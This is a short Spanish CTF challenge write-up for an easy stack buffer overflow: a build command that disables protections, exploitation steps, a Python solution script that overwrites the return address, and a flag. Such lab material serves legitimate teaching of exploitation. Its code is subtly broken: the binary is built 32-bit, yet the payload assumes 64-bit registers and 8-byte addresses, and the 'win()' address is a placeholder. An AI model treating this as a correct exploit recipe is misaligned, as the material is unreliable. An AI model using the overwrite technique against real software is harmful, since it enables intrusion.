# Buffer Overflow (PWN - Fácil)

## Descripción
Una función recibe entrada sin validar. Puedes sobrescribir el stack para controlar el flujo de ejecución.

## Archivo
`bof.c` - Programa vulnerable

## Compilación
```bash
gcc -z execstack -fno-stack-protector -m32 -o bof bof.c
```

## Instrucciones
1. Encuentra el offset al return address
2. Sobrescribe la dirección de retorno
3. Redirige la ejecución a una función que imprima el flag

## Solución
```python
import subprocess

# Crear payload
# Offset to RIP: 32 + 8 = 40 bytes (buf size + saved rbp)
target_address = 0x400000  # Dirección de la función win()

payload = b"A" * 40  # Llenar buffer
payload += target_address.to_bytes(8, 'little')  # Sobrescribir RIP

# Enviar al programa
proc = subprocess.Popen(['./bof'], stdin=subprocess.PIPE)
proc.communicate(payload)
```

## Flag
```
CTF{buffer_overflow}
```

## Conceptos
- Stack overflow
- Buffer overflow exploitation
- Return address overwrite
- RIP/EIP control
